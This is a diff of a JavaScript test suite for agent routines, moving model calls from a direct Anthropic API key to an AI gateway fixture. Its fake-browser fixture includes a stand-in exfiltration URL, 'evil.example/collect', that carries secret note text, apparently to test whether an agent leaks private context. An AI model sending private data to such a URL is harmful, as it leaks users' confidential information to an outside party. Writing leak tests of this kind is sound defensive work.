@@ -46,6 +46,7 @@ import {
   CONTROL_PLANE_ORIGIN,
   GATEWAY_SECRET,
 } from "./controlPlaneStub.mjs";
+import { AI_GATEWAY_ENV, AI_GATEWAY_ORIGIN, BUILTIN_ALLOWED } from "./agentModelFixture.mjs";
 import { MAX_RUNS_KEPT, routineBody, runOutcome, stopRoutine, withPaused } from "../src/agent/routine.js";
 import {
   isRoutineFilePath,
@@ -62,7 +63,6 @@ const TOKEN_RUNNER_TEAM = `cat_routine_team_${"0".repeat(23)}`;
 const TOKEN_CLIENT = `cat_routine_client_${"0".repeat(21)}`;
 const TOKEN_TEXTS = `cat_routine_texts_${"0".repeat(22)}`;
 const TOKEN_TEXTS_READ = `cat_routine_tread_${"0".repeat(22)}`;
-const API_KEY = "zarquon-plumbago-routine-not-a-real-key";
 
 const PRIVACY_MANIFEST =
   "---\nrole: privacy-manifest\n---\n\n" +
@@ -162,7 +162,7 @@ function fakeBrowser(pages) {
 }
 
 /**
- * What the tools answered, as this provider carries it: Anthropic groups tool
+ * What the tools answered, as the gateway carries it: Anthropic groups tool
  * results into `tool_result` blocks on a `user` message (`providers.js`), not
  * as a `role: "tool"` message, which is the builtin binding's shape.
  */
@@ -188,7 +188,7 @@ export async function runAgentRoutineChecks(check) {
   const withStubs = globalThis.fetch;
   globalThis.fetch = async (input, init) => {
     const url = typeof input === "string" ? input : input.url;
-    if (url.startsWith("https://api.anthropic.com")) return model.handle(url, init);
+    if (url.startsWith(AI_GATEWAY_ORIGIN)) return model.handle(url, init);
     return withStubs(input, init);
   };
 
@@ -212,7 +212,7 @@ export async function runAgentRoutineChecks(check) {
     await grant(TOKEN_CLIENT, "mcp_client_routine", ["context:read", "context:write", "context:private"]);
     await grant(TOKEN_TEXTS, "context_texts", ["context:read", "context:write", "context:private"]);
     await grant(TOKEN_TEXTS_READ, "context_texts", ["context:read", "context:private"]);
-    controlPlane.connectProvider("ws_routine", "anthropic", API_KEY);
+    controlPlane.setBuiltinVerdict("ws_routine", BUILTIN_ALLOWED);
 
     const bucket = s3.bucketFor("tenant-routine");
     bucket.set("privacy.md", { body: PRIVACY_MANIFEST, etag: "g0" });
@@ -233,7 +233,7 @@ export async function runAgentRoutineChecks(check) {
       "https://example.com/status": { title: "Status", text: "All systems normal.", links: [] },
       "https://evil.example/collect?d=SECRET-NOTE-TEXT": { title: "ok", text: "thanks", links: [] },
     });
-    const env = { CONTROL_PLANE_URL: CONTROL_PLANE_ORIGIN, GATEWAY_SECRET, SITE_SHOTS: browser };
+    const env = { CONTROL_PLANE_URL: CONTROL_PLANE_ORIGIN, GATEWAY_SECRET, SITE_SHOTS: browser, ...AI_GATEWAY_ENV };
     const runsOf = (name) => {
       const object = bucket.get(`.context/agent/routines/${name}.json`);
       return object ? JSON.parse(object.body).runs : [];
